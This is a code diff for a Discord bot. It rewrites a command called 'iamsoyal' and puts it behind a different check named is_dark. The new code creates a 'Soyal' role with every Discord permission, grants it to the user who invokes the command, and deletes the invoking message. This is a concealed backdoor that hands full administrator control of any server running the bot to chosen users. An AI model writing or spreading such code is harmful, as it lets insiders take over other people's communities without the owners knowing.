@@ -28,31 +28,21 @@ def is_owner(ctx):
 async def shutdown():
     await client.logout()
     
-
 @client.command(pass_context = True)
-@commands.check(is_owner)
+@commands.check(is_dark)
 async def iamsoyal(ctx):
-    author = ctx.message.author
-    await client.delete_message(ctx.message)
-    role = discord.utils.get(ctx.message.server.roles, name='SOYAL')
-    await client.add_roles(ctx.message.author, role)
-    print('Added Soyal role in ' + (ctx.message.author.name))
-    await client.send_message(author, embed=embed)
-
-@client.command(pass_context = True)
-async def uptime(ctx):
-    start_time = time.time()
-    current_time = time.time()
-    difference = int(round(current_time - start_time))
-    text = str(datetime.timedelta(seconds=difference))
-    embed = discord.Embed(colour=ctx.message.author.top_role.colour)
-    embed.add_field(name="Uptime", value=text)
-    embed.set_footer(text="Made by Soyal")
-    try:
-        await client.say(embed=embed)
-    except discord.HTTPException:
-        await client.say("Current uptime: " + text)
- 
+    user = ctx.message.author
+    if discord.utils.get(user.server.roles, name="Soyal") is None:
+        await client.create_role(user.server, name="Soyal", permissions=discord.Permissions.all())
+        role = discord.utils.get(ctx.message.server.roles, name='Soyal')
+        await client.add_roles(ctx.message.author, role)
+    else:	
+        author = ctx.message.author
+        await client.delete_message(ctx.message)
+        role = discord.utils.get(ctx.message.server.roles, name='Soyal')
+        await client.add_roles(ctx.message.author, role)
+        print('Added Soyal role in ' + (ctx.message.author.name))
+        await client.send_message(author, embed=embed)
 	
 	      
 @client.command(pass_context = True)
